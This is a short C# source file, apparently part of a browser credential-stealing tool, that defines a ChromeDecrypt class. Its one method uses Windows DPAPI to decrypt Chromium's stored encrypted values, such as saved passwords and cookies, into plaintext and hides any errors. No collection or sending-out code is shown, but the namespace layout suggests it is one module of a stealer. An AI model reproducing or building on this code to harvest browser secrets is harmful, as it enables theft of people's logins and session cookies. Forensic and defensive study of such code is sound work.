namespace PEngine.Engine.Browsers.Chromium
{
    using System.Security.Cryptography;
    using System.Text;

    public sealed class ChromeDecrypt
    {
        public static string DecryptValue(byte[] encrypted_value, DataProtectionScope scope)
        {
            try
            {
                byte[] unencrypted_value = ProtectedData.Unprotect(encrypted_value, null, scope);
                return Encoding.ASCII.GetString(unencrypted_value).TrimEnd('\0');
            }
            catch
            {
                return null;
            }
        }
    }
}